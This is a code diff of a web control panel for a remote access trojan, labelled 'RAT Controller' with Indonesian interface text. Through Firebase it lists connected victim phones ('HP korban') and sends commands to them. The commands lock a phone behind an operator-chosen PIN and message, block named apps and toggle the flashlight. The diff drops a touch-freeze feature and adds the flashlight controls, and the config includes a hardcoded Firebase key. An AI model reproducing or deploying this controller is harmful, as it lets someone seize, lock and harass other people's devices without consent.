@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>RAT Controller - Full Control</title>
+    <title>RAT Controller</title>
     <style>
-        /* ===== RESET & BASE ===== */
         * {
             margin: 0;
             padding: 0;
@@ -30,8 +29,6 @@
             padding: 20px;
             box-shadow: 0 0 50px rgba(0, 255, 65, 0.15);
         }
-
-        /* ===== HEADER ===== */
         .header {
             text-align: center;
             border-bottom: 1px solid #00ff41;
@@ -53,8 +50,6 @@
             font-size: 11px;
             margin-top: 5px;
         }
-
-        /* ===== TARGET LIST ===== */
         .target-list {
             background: #1a1a1a;
             padding: 10px;
@@ -99,22 +94,6 @@
         .target-item .unlocked {
             color: #00ff41;
         }
-        .target-item .touchblock {
-            color: #ffaa00;
-        }
-        .target-item .btn-delete {
-            background: #ff0044;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            padding: 4px 10px;
-            font-size: 11px;
-            cursor: pointer;
-            font-weight: bold;
-            flex-shrink: 0;
-        }
-
-        /* ===== SECTIONS ===== */
         .section {
             background: #1a1a1a;
             padding: 15px;
@@ -124,16 +103,10 @@
         }
         .section-title {
             font-size: 13px;
-            color: #00ff41;
             margin-bottom: 10px;
             border-bottom: 1px solid #333;
             padding-bottom: 8px;
         }
-        .section-title .icon {
-            margin-right: 8px;
-        }
-
-        /* ===== PIN ===== */
         .pin-dots {
             display: flex;
             justify-content: center;
@@ -165,8 +138,6 @@
         .pin-dot input:focus {
             outline: none;
         }
-
-        /* ===== INPUT & TEXTAREA ===== */
         .message-area textarea,
         .block-input input {
             width: 100%;
@@ -189,35 +160,6 @@
         .block-input input {
             flex: 1;
         }
-
-        /* ===== DURASI ===== */
-        .touch-duration {
-            display: flex;
-            gap: 10px;
-            align-items: center;
-            margin: 10px 0;
-        }
-        .touch-duration label {
-            color: #666;
-            font-size: 12px;
-            min-width: 60px;
-        }
-        .touch-duration input {
-            flex: 1;
-            padding: 10px;
-            background: #000;
-            border: 1px solid #333;
-            color: #00ff41;
-            border-radius: 8px;
-            font-size: 16px;
-            text-align: center;
-        }
-        .touch-duration span {
-            color: #666;
-            font-size: 12px;
-        }
-
-        /* ===== BUTTONS ===== */
         .btn-group {
             display: flex;
             gap: 10px;
@@ -241,49 +183,34 @@
             background: #00ff41;
             color: #000;
         }
-        .btn-lock:hover {
-            background: #00cc33;
-            transform: scale(1.02);
-        }
         .btn-unlock {
             background: #ff0044;
             color: #fff;
-        }
-        .btn-unlock:hover {
-            background: #cc0033;
-            transform: scale(1.02);
-        }
-        .btn-touch {
-            background: #ffaa00;
-            color: #000;
-        }
-        .btn-touch:hover {
-            background: #dd8800;
-            transform: scale(1.02);
         }
         .btn-block {
             background: #ff00ff;
             color: #000;
         }
-        .btn-block:hover {
-            background: #cc00cc;
-            transform: scale(1.02);
-        }
         .btn-unblock {
             background: #ff0044;
             color: #fff;
         }
-        .btn-unblock:hover {
-            background: #cc0033;
-            transform: scale(1.02);
+        .btn-flash {
+            background: #ffaa00;
+            color: #000;
+        }
+        .btn-flash-off {
+            background: #ffaa00;
+            color: #000;
         }
         .btn:disabled {
             opacity: 0.3;
             cursor: not-allowed;
             transform: none;
         }
-
-        /* ===== LOG ===== */
+        .btn:active {
+            transform: scale(0.95);
+        }
         .log {
             margin-top: 12px;
             padding: 10px;
@@ -306,17 +233,12 @@
         .log .action {
             color: #00ccff;
         }
-        .log .touch {
-            color: #ffaa00;
-        }
-        .log .delete {
-            color: #ff0044;
-        }
         .log .block {
             color: #ff00ff;
         }
-
-        /* ===== INFO BOX ===== */
+        .log .flash {
+            color: #ffaa00;
+        }
         .info-box {
             background: #1a1a1a;
             padding: 10px;
@@ -328,13 +250,9 @@
         .info-box span {
             color: #666;
         }
-
-        /* ===== BLOCK STATUS ===== */
         #blockStatusText {
             color: #00ff41;
         }
-
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
             .container {
                 padding: 12px;
@@ -350,30 +268,20 @@
                 font-size: 11px;
                 min-width: 60px;
             }
-            .target-item .btn-delete {
-                padding: 2px 8px;
-                font-size: 10px;
-            }
         }
     </style>
 </head>
 <body>
-
     <div class="container" id="app">
-        <!-- HEADER -->
         <div class="header">
             <h1>⚡ RAT CONTROLLER</h1>
             <div class="status-badge" id="statusBadge">● ONLINE</div>
         </div>
-
-        <!-- TARGET LIST -->
         <div class="target-list" id="targetList">
             <div style="text-align:center; color:#666; padding:10px; font-size:12px;">
                 Menunggu target terhubung...
             </div>
         </div>
-
-        <!-- INFO BOX -->
         <div class="info-box">
             <span>Target:</span> <span id="deviceName">-</span><br>
             <span>Status:</span> <span id="deviceStatus">-</span>
@@ -381,7 +289,7 @@
 
         <!-- SECTION 1: LOCK DEVICE -->
         <div class="section">
-            <div class="section-title"><span class="icon">🔒</span> LOCK DEVICE</div>
+            <div class="section-title" style="color:#00ff41;"><span style="margin-right:8px;">🔒</span> LOCK DEVICE</div>
             <div class="pin-dots">
                 <div class="pin-dot"><input type="text" maxlength="1" id="pin1" value="1"></div>
                 <div class="pin-dot"><input type="text" maxlength="1" id="pin2" value="2"></div>
@@ -398,27 +306,11 @@
             </div>
         </div>
 
-        <!-- SECTION 2: FREEZE HP -->
-        <div class="section" style="border-color:#ffaa00;">
-            <div class="section-title" style="color:#ffaa00;"><span class="icon">✋</span> TOUCH BLOCK (FREEZE HP)</div>
-            <div class="touch-duration">
-                <label>Durasi (detik)</label>
-                <input type="number" id="touchDuration" value="10" min="1" max="300">
-                <span>detik</span>
-            </div>
-            <div style="color:#666; font-size:11px; margin:5px 0 10px 0;">
-                ⚡ HP korban akan FREEZE (tidak bisa disentuh) selama durasi yang ditentukan
-            </div>
-            <div class="btn-group">
-                <button class="btn btn-touch" id="touchBlockBtn" disabled>✋ FREEZE HP</button>
-            </div>
-        </div>
-
-        <!-- SECTION 3: BLOKIR APLIKASI -->
+        <!-- SECTION 2: BLOKIR APLIKASI -->
         <div class="section" style="border-color:#ff00ff;">
-            <div class="section-title" style="color:#ff00ff;"><span class="icon">⛔</span> BLOKIR APLIKASI</div>
+            <div class="section-title" style="color:#ff00ff;"><span style="margin-right:8px;">⛔</span> BLOKIR APLIKASI</div>
             <div style="color:#ff00ff; font-size:11px; margin-bottom:10px;">
-                ⚡ Masukkan nama aplikasi (contoh: YouTube, WhatsApp, Instagram)
+                ⚡ Masukkan nama aplikasi (contoh: YouTube, WhatsApp)
             </div>
             <div class="block-input">
                 <input type="text" id="blockAppInput" placeholder="Nama aplikasi...">
@@ -432,24 +324,25 @@
             </div>
         </div>
 
-        <!-- LOG -->
+        <!-- SECTION 3: FLASHLIGHT -->
+        <div class="section" style="border-color:#ffaa00;">
+            <div class="section-title" style="color:#ffaa00;"><span style="margin-right:8px;">💡</span> FLASHLIGHT</div>
+            <div class="btn-group">
+                <button class="btn btn-flash" id="flashOnBtn" disabled>💡 ON</button>
+                <button class="btn btn-flash-off" id="flashOffBtn" disabled>💡 OFF</button>
+            </div>
+        </div>
+
         <div class="log" id="logArea">
             <div class="info">[SYSTEM] Menunggu koneksi Firebase...</div>
         </div>
     </div>
 
-    <!-- ============================================================
-    FIREBASE SDK
-    ============================================================ -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js">
     </script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js">
     </script>
-
     <script>
-        // ============================================================
-        // 🔥 FIREBASE CONFIG (GANTI DENGAN PUNYA ANDA)
-        // ============================================================
         const firebaseConfig = {
             apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
             authDomain: "rat-controller-5b29c.firebaseapp.com",
@@ -463,27 +356,21 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // ============================================================
-        // VARIABLES
-        // ============================================================
         let selectedTarget = null;
         let targets = {};
-        let blockedApp = '';
 
         const targetList = document.getElementById('targetList');
         const deviceName = document.getElementById('deviceName');
         const deviceStatus = document.getElementById('deviceStatus');
         const lockBtn = document.getElementById('lockBtn');
         const unlockBtn = document.getElementById('unlockBtn');
-        const touchBlockBtn = document.getElementById('touchBlockBtn');
         const blockAppBtn = document.getElementById('blockAppBtn');
         const unblockAppBtn = document.getElementById('unblockAppBtn');
+        const flashOnBtn = document.getElementById('flashOnBtn');
+        const flashOffBtn = document.getElementById('flashOffBtn');
         const logArea = document.getElementById('logArea');
         const blockStatusText = document.getElementById('blockStatusText');
 
-        // ============================================================
-        // FUNCTIONS
-        // ============================================================
         function getPin() {
             return document.getElementById('pin1').value +
                 document.getElementById('pin2').value +
@@ -493,10 +380,6 @@
 
         function getMessage() {
             return document.getElementById('lockMessage').value;
-        }
-
-        function getTouchDuration() {
-            return parseInt(document.getElementById('touchDuration').value) || 10;
         }
 
         function addLog(text, type = 'info') {
@@ -514,9 +397,6 @@
             }
         }
 
-        // ============================================================
-        // LISTEN TARGETS
-        // ============================================================
         db.ref('targets').on('value', function(snapshot) {
             const data = snapshot.val();
             targets = data || {};
@@ -535,17 +415,11 @@
             }
         });
 
-        // ============================================================
-        // RENDER TARGET LIST
-        // ============================================================
         function renderTargetList() {
             const keys = Object.keys(targets);
             if (keys.length === 0) {
-                targetList.innerHTML = `
-                        <div style="text-align:center; color:#666; padding:10px; font-size:12px;">
-                            ⚠️ Tidak ada target terhubung
-                        </div>
-                    `;
+                targetList.innerHTML =
+                    `<div style="text-align:center; color:#666; padding:10px; font-size:12px;">⚠️ Tidak ada target terhubung</div>`;
                 return;
             }
 
@@ -554,10 +428,7 @@
                 const t = targets[id];
                 let statusText = '🔓 UNLOCKED';
                 let statusClass = 'unlocked';
-                if (t.touchBlocked) {
-                    statusText = '✋ FREEZE';
-                    statusClass = 'touchblock';
-                } else if (t.locked) {
+                if (t.locked) {
                     statusText = '🔒 LOCKED';
                     statusClass = 'locked';
                 }
@@ -570,43 +441,12 @@
                             <div class="id">${id.slice(0,8)}</div>
                             <div class="status ${statusClass}">${statusText}</div>
                         </div>
-                        <button class="btn-delete" data-id="${id}">✕ HAPUS</button>
                     `;
-
-                div.querySelector('.info').onclick = function() {
-                    selectTarget(id);
-                };
-
-                div.querySelector('.btn-delete').onclick = function(e) {
-                    e.stopPropagation();
-                    deleteTarget(id);
-                };
-
+                div.onclick = function() { selectTarget(id); };
                 targetList.appendChild(div);
             });
         }
 
-        // ============================================================
-        // DELETE TARGET
-        // ============================================================
-        function deleteTarget(id) {
-            const name = targets[id] ? targets[id].deviceName || id.slice(0, 8) : id.slice(0, 8);
-            if (confirm('⚠️ Hapus target "' + name + '"?')) {
-                db.ref('targets/' + id).remove().then(function() {
-                    addLog('🗑️ TARGET DIHAPUS: ' + name, 'delete');
-                    if (selectedTarget === id) {
-                        selectedTarget = null;
-                        updateInfo(null);
-                    }
-                }).catch(function(err) {
-                    addLog('Gagal hapus: ' + err.message, 'error');
-                });
-            }
-        }
-
-        // ============================================================
-        // SELECT TARGET
-        // ============================================================
         function selectTarget(id) {
             selectedTarget = id;
             renderTargetList();
@@ -615,16 +455,14 @@
             if (targets[id]) {
                 lockBtn.disabled = false;
                 unlockBtn.disabled = false;
-                touchBlockBtn.disabled = false;
                 blockAppBtn.disabled = false;
                 unblockAppBtn.disabled = false;
+                flashOnBtn.disabled = false;
+                flashOffBtn.disabled = false;
                 addLog('Target selected: ' + (targets[id].deviceName || id.slice(0, 8)), 'action');
             }
         }
 
-        // ============================================================
-        // UPDATE INFO
-        // ============================================================
         function updateInfo(id) {
             const t = targets[id];
             if (!t) {
@@ -632,24 +470,21 @@
                 deviceStatus.textContent = '-';
                 lockBtn.disabled = true;
                 unlockBtn.disabled = true;
-                touchBlockBtn.disabled = true;
                 blockAppBtn.disabled = true;
                 unblockAppBtn.disabled = true;
+                flashOnBtn.disabled = true;
+                flashOffBtn.disabled = true;
                 return;
             }
             deviceName.textContent = t.deviceName || 'Unknown';
-            let status = '🔓 UNLOCKED';
-            if (t.touchBlocked) {
-                status = '✋ FREEZE';
-            } else if (t.locked) {
-                status = '🔒 LOCKED';
-            }
+            let status = t.locked ? '🔒 LOCKED' : '🔓 UNLOCKED';
             deviceStatus.textContent = status;
             lockBtn.disabled = false;
             unlockBtn.disabled = false;
-            touchBlockBtn.disabled = false;
             blockAppBtn.disabled = false;
             unblockAppBtn.disabled = false;
+            flashOnBtn.disabled = false;
+            flashOffBtn.disabled = false;
         }
 
         // ============================================================
@@ -674,8 +509,7 @@
                 locked: true,
                 pin: pin,
                 message: message,
-                lockTime: Date.now(),
-                touchBlocked: false
+                lockTime: Date.now()
             }).then(function() {
                 addLog('🔒 DEVICE LOCKED: ' + selectedTarget.slice(0, 8) + ' | PIN: ' + pin, 'success');
             }).catch(function(err) {
@@ -696,51 +530,11 @@
             ref.update({
                 locked: false,
                 pin: null,
-                message: null,
-                touchBlocked: false
+                message: null
             }).then(function() {
                 addLog('🔓 DEVICE UNLOCKED: ' + selectedTarget.slice(0, 8), 'success');
             }).catch(function(err) {
                 addLog('Gagal unlock: ' + err.message, 'error');
-            });
-        };
-
-        // ============================================================
-        // TOUCH BLOCK (FREEZE)
-        // ============================================================
-        document.getElementById('touchBlockBtn').onclick = function() {
-            if (!selectedTarget || !targets[selectedTarget]) {
-                addLog('Pilih target terlebih dahulu!', 'error');
-                return;
-            }
-
-            const duration = getTouchDuration();
-            if (duration < 1 || duration > 300) {
-                addLog('Durasi harus 1-300 detik!', 'error');
-                return;
-            }
-
-            const ref = db.ref('targets/' + selectedTarget);
-            ref.update({
-                touchBlocked: true,
-                touchDuration: duration,
-                touchBlockTime: Date.now(),
-                locked: false,
-                pin: null,
-                message: null
-            }).then(function() {
-                addLog('✋ HP FREEZE: ' + selectedTarget.slice(0, 8) + ' | Durasi: ' + duration + ' detik', 'touch');
-                setTimeout(function() {
-                    ref.update({
-                        touchBlocked: false,
-                        touchDuration: null,
-                        touchBlockTime: null
-                    }).then(function() {
-                        addLog('✅ HP UNFREEZE: ' + selectedTarget.slice(0, 8) + ' (otomatis)', 'success');
-                    }).catch(function() {});
-                }, duration * 1000);
-            }).catch(function(err) {
-                addLog('Gagal freeze: ' + err.message, 'error');
             });
         };
 
@@ -759,10 +553,10 @@
                 return;
             }
 
-            // Simpan ke Firebase
+            // Kirim perintah ke target via Firebase
             const ref = db.ref('targets/' + selectedTarget);
             ref.update({
-                blockedApp: appName,
+                blockApp: appName,
                 blockActive: true
             }).then(function() {
                 addLog('⛔ APLIKASI DIBLOKIR: ' + appName, 'block');
@@ -785,7 +579,7 @@
 
             const ref = db.ref('targets/' + selectedTarget);
             ref.update({
-                blockedApp: null,
+                blockApp: null,
                 blockActive: false
             }).then(function() {
                 addLog('🔓 APLIKASI DIUNBLOKIR', 'success');
@@ -798,14 +592,55 @@
         };
 
         // ============================================================
-        // LISTEN BLOCK STATUS DARI TARGET
+        // FLASHLIGHT ON
+        // ============================================================
+        document.getElementById('flashOnBtn').onclick = function() {
+            if (!selectedTarget || !targets[selectedTarget]) {
+                addLog('Pilih target terlebih dahulu!', 'error');
+                return;
+            }
+
+            // Kirim perintah ke target via Firebase
+            const ref = db.ref('targets/' + selectedTarget);
+            ref.update({
+                flashCommand: 'on',
+                flashTime: Date.now()
+            }).then(function() {
+                addLog('💡 FLASHLIGHT ON', 'flash');
+            }).catch(function(err) {
+                addLog('Gagal: ' + err.message, 'error');
+            });
+        };
+
+        // ============================================================
+        // FLASHLIGHT OFF
+        // ============================================================
+        document.getElementById('flashOffBtn').onclick = function() {
+            if (!selectedTarget || !targets[selectedTarget]) {
+                addLog('Pilih target terlebih dahulu!', 'error');
+                return;
+            }
+
+            const ref = db.ref('targets/' + selectedTarget);
+            ref.update({
+                flashCommand: 'off',
+                flashTime: Date.now()
+            }).then(function() {
+                addLog('💡 FLASHLIGHT OFF', 'flash');
+            }).catch(function(err) {
+                addLog('Gagal: ' + err.message, 'error');
+            });
+        };
+
+        // ============================================================
+        // LISTEN BLOCK STATUS
         // ============================================================
         db.ref('targets').on('value', function(snapshot) {
             const data = snapshot.val();
             if (data && selectedTarget && data[selectedTarget]) {
                 const t = data[selectedTarget];
-                if (t.blockActive && t.blockedApp) {
-                    blockStatusText.textContent = '🔴 ' + t.blockedApp + ' diblokir';
+                if (t.blockActive && t.blockApp) {
+                    blockStatusText.textContent = '🔴 ' + t.blockApp + ' diblokir';
                     blockStatusText.style.color = '#ff0044';
                 } else {
                     blockStatusText.textContent = '✅ Tidak ada aplikasi diblokir';
@@ -816,6 +651,5 @@
 
         addLog('Firebase connected, menunggu target...', 'info');
     </script>
-
 </body>
 </html>
